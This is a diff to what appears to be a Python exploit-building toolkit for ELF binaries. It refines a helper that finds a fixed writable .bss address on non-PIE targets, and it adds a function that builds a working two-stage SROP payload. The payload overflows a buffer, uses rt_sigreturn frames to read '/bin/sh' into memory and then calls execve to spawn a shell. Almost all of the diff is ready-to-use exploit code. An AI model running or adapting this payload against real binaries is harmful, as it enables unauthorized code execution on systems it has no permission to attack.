@@ -170,14 +170,33 @@ def find_pop_rax(data: bytes):
 
 
 def find_writable(data: bytes, need: int = 16):
-    """(vaddr, size) of a writable PT_LOAD segment with at least `need` bytes, or None. Where a
-    read() can plant "/bin/sh" at a fixed address on a no-PIE target."""
-    for off, sz, va, flags in _loads(data):
-        # p_flags bit1 = W. Use MEMSZ where available; _loads gives filesz, which for .data is fine
-        # and for .bss undercounts -- but any writable LOAD gives us a usable address.
-        if (flags & 2) and sz >= need:
-            return (va, sz)
-    return None
+    """(vaddr, size) of a SAFE fixed writable address to plant bytes on a no-PIE target: an address
+    in the .bss (the uninitialized tail of a writable PT_LOAD, past p_filesz) rather than the
+    segment START -- the start holds .dynamic/.got/.data, and a read() that overruns them corrupts
+    the loader state and crashes before execve. Falls back to the segment start only if no .bss."""
+    if len(data) < 64 or data[:4] != b"\x7fELF" or data[4] != 2:
+        return None
+    endc = "<" if data[5] == 1 else ">"
+    e_phoff = struct.unpack_from(endc + "Q", data, 32)[0]
+    e_phentsize, e_phnum = struct.unpack_from(endc + "HH", data, 54)
+    fallback = None
+    for i in range(e_phnum):
+        o = e_phoff + i * e_phentsize
+        if o + e_phentsize > len(data):
+            break
+        p_type, p_flags = struct.unpack_from(endc + "II", data, o)
+        if p_type != 1 or not (p_flags & 2):            # PT_LOAD, writable (p_flags bit1 = W)
+            continue
+        p_vaddr = struct.unpack_from(endc + "Q", data, o + 16)[0]
+        p_filesz = struct.unpack_from(endc + "Q", data, o + 32)[0]
+        p_memsz = struct.unpack_from(endc + "Q", data, o + 40)[0]
+        bss = (p_vaddr + p_filesz + 0xF) & ~0xF         # start of .bss, 16-aligned
+        room = (p_vaddr + p_memsz) - bss
+        if room >= max(need, 16):
+            return (bss, room)                          # uninitialized -> safe to clobber
+        if fallback is None and p_memsz >= need:
+            fallback = (p_vaddr, p_memsz)
+    return fallback
 
 
 def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx=0,
@@ -218,3 +237,28 @@ def build_srop_execve(offset: int, *, syscall: int, binsh: int, length: int,
     if len(body) < length:
         body += b"C" * (length - len(body))
     return bytes(body)
+
+
+def build_srop_execve_plant(offset: int, *, syscall: int, pop_rax: int, writable: int,
+                            count: int = 0x200, binsh_off: int = 0x120):
+    """Two-STAGE SROP execve for a binary that has a writable segment and a `pop rax` gadget but NO
+    "/bin/sh" string in the image: PLANT the string via a read, then execve it. No leak needed on a
+    no-PIE target because `writable` is a fixed address.
+
+      stage1 (to the overflowing read): pad(offset) -> pop rax;15 -> syscall(rt_sigreturn) ->
+        frame{rax=0(read), rdi=0, rsi=writable, rdx=count, rip=syscall, rsp=writable}
+        -- so after the read the `ret` pivots rsp INTO the freshly-read stage2.
+      stage2 (to that read): pop rax;15 -> syscall(rt_sigreturn) ->
+        frame{rax=59(execve), rdi=writable+binsh_off, rip=syscall} ... "/bin/sh\\0" at +binsh_off.
+
+    Returns (stage1, stage2): send stage1 to the overflow, then stage2 to the planted read.
+    """
+    def _set_rax15():                                # pop rax;15; then the syscall gadget
+        return struct.pack("<Q", pop_rax) + struct.pack("<Q", 15) + struct.pack("<Q", syscall)
+    binsh = writable + binsh_off
+    stage2 = _set_rax15() + sigreturn_frame(rip=syscall, rax=59, rdi=binsh, rsi=0, rdx=0,
+                                            rsp=writable)
+    stage2 = stage2.ljust(binsh_off, b"\x00") + b"/bin/sh\x00"
+    frame1 = sigreturn_frame(rip=syscall, rax=0, rdi=0, rsi=writable, rdx=count, rsp=writable)
+    stage1 = bytes(_cyclic(offset)) + _set_rax15() + frame1
+    return stage1, stage2
